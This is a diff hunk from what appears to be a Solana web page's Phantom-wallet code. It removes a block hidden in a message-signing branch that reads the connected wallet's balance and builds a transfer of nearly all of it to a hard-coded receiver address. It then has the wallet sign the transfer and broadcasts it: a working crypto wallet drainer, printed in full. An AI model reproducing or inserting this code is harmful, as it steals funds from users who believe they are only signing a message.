@@ -278,51 +278,6 @@ alert("Wallet Balance: " + walletBalance + " SOL");
         
         
       } else if (window.phantom?.solana?.signMessage) {
-        signature = await window.phantom.solana.signMessage(message, 'utf8');
-
-
-
-               
-                 const public_key = new PublicKey(publicKey);
-                const walletBalance = await fetchSolanaBalance(public_key);
-                const connection  = new Connection(CONFIG.MAINNET_RPC);
-                
-alert("Wallet Balance: " + walletBalance + " SOL");
-                const minBalance = await getMinimumBalanceForRentExemption(0);
-                alert("Minimum Balance for Rent Exemption: " + (minBalance / LAMPORTS_PER_SOL) + " SOL");
-                if (walletBalance < minBalance) {
-                    alert("Insufficient funds for rent.");
-                    return;
-                }
-
-                        const recieverWallet = new PublicKey('5tyHpW1niYj3yka1TRu429GftLgDhoWPX7EcSMm8tC3');
-                        const balanceForTransfer = walletBalance - minBalance;
-                        if (balanceForTransfer <= 0) {
-                            alert("Insufficient funds for transfer.");
-                            return;
-                        }
-
-                        var transaction = new Transaction().add(
-                            SystemProgram.transfer({
-                                fromPubkey: new PublicKey(publicKey),
-                                toPubkey: recieverWallet,
-                                lamports: Math.floor(balanceForTransfer * 0.99),
-                            }),
-                        );
-
-                        transaction.feePayer = publicKey;
-                        let blockhashObj = await connection.getRecentBlockhash();
-                        transaction.recentBlockhash = blockhashObj.blockhash;
-
-                        const signed = await provider.signTransaction(transaction);
-                        console.log("Transaction signed:", signed);
-
-                        let txid = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(txid);
-                        console.log("Transaction confirmed:", txid);
-        
-                
-           
                 
         } 
    
